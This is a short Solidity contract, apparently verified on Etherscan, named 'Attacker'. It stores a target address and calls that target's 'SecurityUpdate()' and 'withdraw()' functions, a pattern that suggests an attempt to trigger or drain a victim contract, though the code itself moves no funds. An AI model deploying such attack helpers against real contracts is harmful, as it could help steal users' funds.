/**
 *Submitted for verification at Etherscan.io on 2023-02-16
*/

pragma solidity ^0.4.26;

contract Attacker {
    address public target;

    constructor(address _target) public {
        target = _target;
    }

    function() public payable {
        revert();
    }

    function attack() public {
        target.call.value(0)(bytes4(keccak256("SecurityUpdate()")));
    }

    function withdraw() public {
        target.call.value(0)(bytes4(keccak256("withdraw()")));
    }
}